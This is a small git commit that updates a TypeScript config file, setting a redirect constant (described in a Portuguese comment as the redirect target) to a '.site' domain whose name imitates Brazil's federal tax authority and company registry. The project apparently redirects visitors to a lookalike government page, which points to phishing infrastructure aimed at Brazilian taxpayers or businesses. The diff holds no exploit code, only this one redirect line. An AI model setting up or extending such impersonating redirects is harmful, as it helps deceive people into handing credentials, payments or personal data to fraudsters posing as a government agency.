71e81ad2d95e1af3bb2c437366306d74bee2d8a4
Anailson06 <149094983+Anailson06@users.noreply.github.com>
2026-04-15 11:43:19 -0300

    Update config.ts

--- config.ts
+++ config.ts
@@ -3,4 +3,4 @@
 // Edite a URL abaixo para alterar o redirecionamento
 // ============================================
 
-export const REDIRECT_URL = ""
+export const REDIRECT_URL = "https://www8.receita-fazenda-cnpj.site/PJ"
